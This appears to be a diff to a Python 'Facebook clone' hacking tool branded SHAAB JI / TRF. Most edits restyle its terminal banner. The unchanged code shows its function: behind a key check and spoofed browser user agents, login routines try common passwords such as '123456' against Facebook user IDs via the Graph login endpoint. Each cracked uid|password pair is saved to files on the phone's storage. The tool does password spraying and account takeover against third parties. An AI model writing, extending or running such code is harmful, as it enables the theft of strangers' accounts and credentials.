@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-# 👑 SHAAB____JI FACEBOOK CLONE TOOL
+# 👑 SHAAB JI FACEBOOK CLONE TOOL
 # 🔥 POWERED BY TRF - THE REAL FORCE
 
 import os
@@ -47,12 +47,14 @@ VALID_KEYS = [
     "TRF-ROCKS-999"
 ]
 
+RESET = '\x1b[0m'
+
 def verify_key():
     print("\033[1;36m" + "═" * 50)
     user_key = input("\n\033[1;37m[?] Enter your key: ").strip().upper()
     
     if user_key in VALID_KEYS:
-        print("\n\033[1;32m[✓] ✅ Key Verified! Welcome SHAAB____JI!\n")
+        print("\n\033[1;32m[✓] ✅ Key Verified! Welcome SHAAB JI!\n")
         return True
     else:
         print("\n\033[1;31m[×] ❌ Invalid Key! Try again.\n")
@@ -110,40 +112,71 @@ loop = 0
 user = []
 
 def linex():
-    print(f'{GOLD}═══════════════════════════════════════════════════════')
+    print(f'{GOLD}═══════════════════════════════════════════════════════{RESET}')
+
+# ============================================
+# 👑 SHAAB JI 3D BANNER (TERMUX OPTIMIZED)
+# ============================================
 
 def __shaab__banner__():
     if os.name == 'nt':
         os.system('cls')
     else:
         os.system('clear')
-    
-    print(f"""{PURPLE}
-    ╔══════════════════════════════════════════════════════════════╗
-    ║  ███████╗██╗  ██╗ █████╗  █████╗ ██████╗                     ║
-    ║  ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗                    ║
-    ║  ███████╗███████║███████║███████║██████╔╝                    ║
-    ║  ╚════██║██╔══██║██╔══██║██╔══██║██╔══██╗                    ║
-    ║  ███████║██║  ██║██║  ██║██║  ██║██████╔╝                    ║
-    ║  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝                     ║
-    ╚══════════════════════════════════════════════════════════════╝
-    {CYAN}   ███████╗██╗  ██╗ █████╗  █████╗ ██████║                 
-    {CYAN}   ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗                
-    {CYAN}   ███████╗███████║███████║███████║██████╔╝                
-    {CYAN}   ╚════██║██╔══██║██╔══██║██╔══██║██╔══██╗                
-    {CYAN}   ███████║██║  ██║██║  ██║██║  ██║██████╔╝                
-    {CYAN}   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝                 
-    {GOLD}   ═══════════════════════════════════════════════════════════
-    {Y}   👑 𝐒𝐇𝐀𝐀𝐁____𝐉𝐈 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐂𝐋𝐎𝐍𝐄𝐑 👑
-    {BLUE}   ═══════════════════════════════════════════════════════════
-    {G}   [+] OWNER    : SHAAB____JI 👑
-    {PURPLE}   [+] TEAM     : TRF - THE REAL FORCE 🔥
-    {G}   [+] STATUS   : KEY UNLOCKED ✅
-    {Y}   [+] VERSION  : 4.0 ULTIMATE
-    {BLUE}   ═══════════════════════════════════════════════════════════
-    {PINK}   💀 "𝐓𝐑𝐅 𝐊𝐀 𝐁𝐀𝐀𝐃𝐒𝐇𝐀𝐇 𝐒𝐈𝐑𝐅 𝐒𝐇𝐀𝐀𝐁____𝐉𝐈" 💀
-    {GOLD}   ═══════════════════════════════════════════════════════════
-    """)
+
+    # --- 3D gradient (top highlight → bottom shadow) ---
+    # Yellow → Gold → Orange → Dark Orange → Red  (gives 3D cylinder feel)
+    grad = [
+        '\x1b[1;38;5;226m',   # bright yellow   (top highlight)
+        '\x1b[1;38;5;220m',   # gold
+        '\x1b[1;38;5;214m',   # orange-gold
+        '\x1b[1;38;5;208m',   # orange
+        '\x1b[1;38;5;202m',   # dark orange
+        '\x1b[1;38;5;196m',   # red (bottom shadow)
+    ]
+
+    # --- Big "SHAAB JI" block art ---
+    art = [
+        " ███████╗██╗  ██╗ █████╗  █████╗ ██████╗     ██╗██╗",
+        " ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗    ██║██║",
+        " ███████╗███████║███████║███████║██████╔╝    ██║██║",
+        " ╚════██║██╔══██║██╔══██║██╔══██║██╔══██╗    ██║██║",
+        " ███████║██║  ██║██║  ██║██║  ██║██████╔╝    ██║██║",
+        " ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═╝╚═╝",
+    ]
+
+    # --- Header strip ---
+    print()
+    print(f"{PURPLE}  ╔══════════════════════════════════════════════════════════╗{RESET}")
+    print(f"{PURPLE}  ║{RESET}        {PINK}👑   T R F   P R E S E N T S   👑{RESET}                  {PURPLE}║{RESET}")
+    print(f"{PURPLE}  ╚══════════════════════════════════════════════════════════╝{RESET}")
+    print()
+
+    # --- 3D Gradient Name ---
+    for i, line in enumerate(art):
+        print(f"{grad[i]}  {line}{RESET}")
+
+    print()
+
+    # --- Subtitle (3D glow) ---
+    print(f"{Y}     ★  S H A A B   J I   F A C E B O O K   C L O N E R  ★{RESET}")
+    print(f"{GOLD}  ═══════════════════════════════════════════════════════════{RESET}")
+
+    # --- Info Block ---
+    print(f"{G}   [+] OWNER    : {Y}SHAAB JI {PINK}👑{RESET}")
+    print(f"{PURPLE}   [+] TEAM     : {PINK}TRF - THE REAL FORCE {Y}🔥{RESET}")
+    print(f"{G}   [+] STATUS   : {Y}KEY UNLOCKED {G}✅{RESET}")
+    print(f"{CYAN}   [+] VERSION  : {Y}4.0 ULTIMATE{RESET}")
+    print(f"{GOLD}  ═══════════════════════════════════════════════════════════{RESET}")
+
+    # --- Quote (3D blink effect feel) ---
+    print(f"{PINK}   💀  \"T R F  K A  B A A D S H A H  S I R F  S H A A B  J I\"  💀{RESET}")
+    print(f"{GOLD}  ═══════════════════════════════════════════════════════════{RESET}")
+    print()
+
+# ============================================
+# YEAR DETECTION
+# ============================================
 
 def creationyear(uid):
     if len(uid) == 15:
@@ -220,6 +253,10 @@ def window1():
     latest_patch = rr(100, 200)
     D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
     return random.choice([A, B, C, D])
+
+# ============================================
+# MENU
+# ============================================
 
 def BNG_71_():
     __shaab__banner__()
@@ -375,11 +412,15 @@ def old_Tree():
                 print(f"    {rad}[!] INVALID METHOD!")
                 break
 
+# ============================================
+# LOGIN METHODS
+# ============================================
+
 def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r{W}{rad}+{W}{rad}({W}SHAAB-JI M1{rad}){W}{rad}{W}{rad}({CYAN}{loop}{rad}){W}{rad}({W}OK{rad}){W}{rad}({CYAN}{len(oks)}{rad})")
+        sys.stdout.write(f"\r\r{W}{rad}+{W}{rad}({W}SHAAB JI M1{rad}){W}{rad}{W}{rad}({CYAN}{loop}{rad}){W}{rad}({W}OK{rad}){W}{rad}({CYAN}{len(oks)}{rad})")
         sys.stdout.flush()
         
         for pw in ('123456', '1234567', '12345678', '123456789'):
@@ -428,13 +469,13 @@ def login_1(uid):
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             
             if 'session_key' in res:
-                print(f"\r\r{W}> {rad}├Ч{W}<{rad}({W}SHAAB-JI {rad}) {W}= {G}{uid} {W}= {G}{pw} {W}= {CYAN}{creationyear(uid)}")
+                print(f"\r\r{W}> {rad}├Ч{W}<{rad}({W}SHAAB JI {rad}) {W}= {G}{uid} {W}= {G}{pw} {W}= {CYAN}{creationyear(uid)}")
                 with open('/sdcard/SHAAB-JI-OK-M1.txt', 'a') as f:
                     f.write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r{W}{rad}{W}{rad}({W}SHAAB-JI{rad}) {W}= {G}{uid} {W}= {G}{pw} {W}= {CYAN}{creationyear(uid)}")
+                print(f"\r\r{W}{rad}{W}{rad}({W}SHAAB JI{rad}) {W}= {G}{uid} {W}= {G}{pw} {W}= {CYAN}{creationyear(uid)}")
                 with open('/sdcard/SHAAB-JI-OK-M1.txt', 'a') as f:
                     f.write(f"{uid}|{pw}\n")
                 oks.append(uid)
@@ -446,7 +487,7 @@ def login_1(uid):
 def login_2(uid):
     global loop
     try:
-        sys.stdout.write(f"\r\r{W}{rad}+{W}{rad}({W}SHAAB-JI M2{rad}){W}{rad}{W}{rad}({CYAN}{loop}{rad}){W}{rad}({W}OK{rad}){W}{rad}({CYAN}{len(oks)}{rad})")
+        sys.stdout.write(f"\r\r{W}{rad}+{W}{rad}({W}SHAAB JI M2{rad}){W}{rad}{W}{rad}({CYAN}{loop}{rad}){W}{rad}({W}OK{rad}){W}{rad}({CYAN}{len(oks)}{rad})")
         sys.stdout.flush()
         
         for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
@@ -467,7 +508,7 @@ def login_2(uid):
                     response = session.get(url, headers=headers, timeout=10).json()
                     
                     if 'session_key' in str(response) or 'session_key' in response:
-                        print(f"\r\r{W}{rad}{W}<{rad}({W}SHAAB-JI{rad}) {W}= {G}{uid} {W}= {G}{pw} {W}= {CYAN}{creationyear(uid)}")
+                        print(f"\r\r{W}{rad}{W}<{rad}({W}SHAAB JI{rad}) {W}= {G}{uid} {W}= {G}{pw} {W}= {CYAN}{creationyear(uid)}")
                         with open('/sdcard/SHAAB-JI-OK-M2.txt', 'a') as f:
                             f.write(f"{uid}|{pw}\n")
                         oks.append(uid)
@@ -484,18 +525,16 @@ def login_2(uid):
 
 if __name__ == "__main__":
     try:
-        sys.stdout.write('\x1b]2;👑 SHAAB____JI TRF TOOL 👑 \x07')
-        # Key verification first
+        sys.stdout.write('\x1b]2;👑 SHAAB JI - TRF TOOL 👑 \x07')
         if not verify_key():
             sys.exit(1)
-        # After verification, show banner and menu
         BNG_71_()
     except KeyboardInterrupt:
         print(f"\n\n{rad}[!] Process interrupted by user")
-        print(f"{Y}👑 SHAAB____JI says: 'TRF ka baadshah sirf SHAAB____JI'")
+        print(f"{Y}👑 SHAAB JI says: 'TRF ka baadshah sirf SHAAB JI'")
         print(f"{PURPLE}🔥 TRF - THE REAL FORCE 🔥")
         sys.exit(0)
     except Exception as e:
         print(f"\n{rad}[!] Error: {e}")
-        print(f"{Y}👑 SHAAB____JI is here to help!")
+        print(f"{Y}👑 SHAAB JI is here to help!")
         sys.exit(1)
